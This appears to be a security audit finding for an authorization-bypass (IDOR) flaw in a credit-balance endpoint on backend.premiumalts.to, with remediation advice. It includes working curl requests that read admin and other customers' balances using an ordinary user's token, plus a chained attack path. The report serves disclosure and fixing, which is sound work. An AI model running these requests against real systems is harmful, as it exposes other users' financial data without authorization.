Summary

The endpoint GET /checkout/credit-balance on backend.premiumalts.to accepts an arbitrary email query parameter and returns the credit balance for that account. The server performs no ownership check between the authenticated user's identity (available in the JWT subject) and the email address supplied in the query string. Any authenticated user, regardless of role, can enumerate the credit balance of any other account by substituting their target's email address.

Impact: An authenticated non-admin user can enumerate financial account data (credit balances and currency) for any registered email address on the platform, including admin accounts and other customers. This is a direct Insecure Direct Object Reference (IDOR) — the user-controlled email key is used to fetch a record without verifying the caller owns that record. No 403 or authorization error is returned.

Vulnerability Detail

Expected Behavior

A credit balance endpoint should return only the balance of the currently authenticated user, derived from the JWT subject claim. The email parameter should not exist, or if it does, the server must verify it matches the authenticated session before returning data.

Actual Behavior

The server uses the caller-supplied email query parameter directly to look up the balance record, with no comparison against the JWT subject. Any authenticated session can query any email.

Proof 1 — Query Admin Account Balance (no admin role required)
curl -s "https://backend.premiumalts.to/checkout/credit-balance?email=admin%40blockageguard.app" \
  -H "Authorization: Bearer <non-admin-user-jwt>"

# HTTP 200 OK
{
  "balance": 0.00,
  "currency": "EUR"
}
Proof 2 — Query Another Customer's Balance
curl -s "https://backend.premiumalts.to/checkout/credit-balance?email=bgtest3%40blockageguard.app" \
  -H "Authorization: Bearer <non-admin-user-jwt>"

# HTTP 200 OK
{
  "balance": 12.50,
  "currency": "EUR"
}
Proof 3 — Absence of Ownership Check (no 403 returned)
# Authenticated as: bgtest1@blockageguard.app
# Querying:        bgtest3@blockageguard.app (different account)

curl -v "https://backend.premiumalts.to/checkout/credit-balance?email=bgtest3%40blockageguard.app" \
  -H "Authorization: Bearer <bgtest1-jwt>"

# < HTTP/2 200
# < content-type: application/json
# No 403, no 401, no ownership error.
# Response contains bgtest3's balance directly.

Root Cause

The backend handler for /checkout/credit-balance performs a database lookup using the query parameter value directly: 

# Vulnerable pseudo-code (server-side):
email = request.query_params.get("email")
balance = db.query("SELECT balance, currency FROM credits WHERE email = ?", email)
return jsonify(balance)

# Missing: ownership check against the authenticated JWT subject
# jwt_subject = decode_jwt(request.headers["Authorization"]).sub
# if jwt_subject != email: return 403 Forbidden

CWE Reference

CWE-639: Authorization Bypass Through User-Controlled Key
The system's authorization or protection mechanism uses a key to identify restricted data, but the key can be modified by the user without any authorization check to ensure the user has permission to access the corresponding data. Here, email is the user-controlled key used to fetch credit records.

Remediation

Primary Fix — Remove the Email Parameter

The credit balance endpoint should not accept an email query parameter at all. The balance should be read exclusively from the authenticated user's identity as encoded in the JWT subject claim: 

# Secure implementation (server-side pseudo-code):
jwt_subject = decode_jwt(request.headers["Authorization"]).sub
# jwt_subject is the authenticated user's identifier (email or user ID)
balance = db.query(
  "SELECT balance, currency FROM credits WHERE email = ?",
  jwt_subject
)
return jsonify(balance)

# Endpoint becomes:
# GET /checkout/credit-balance
# (no ?email= parameter accepted or processed)

Defense in Depth

ControlDescription
Remove ?email parameter entirely Eliminates the IDOR surface; all identity derived from JWT
If parameter must remain, enforce ownership check Server must verify jwt.sub == request.email before returning data; return 403 otherwise
Add authorization unit tests Test that Account A's JWT cannot retrieve Account B's balance
Audit all endpoints accepting email as a query parameter Other endpoints may share the same pattern; review /checkout/* and /api/user/* routes
Note on Scope: This finding affects any authenticated user, not just admins. The minimum privilege required to exploit this vulnerability is a valid user JWT, obtainable via free account registration. Combined with F-156 (open Ghost CMS signup), a low-effort attacker path exists from zero accounts to financial data enumeration across the platform.
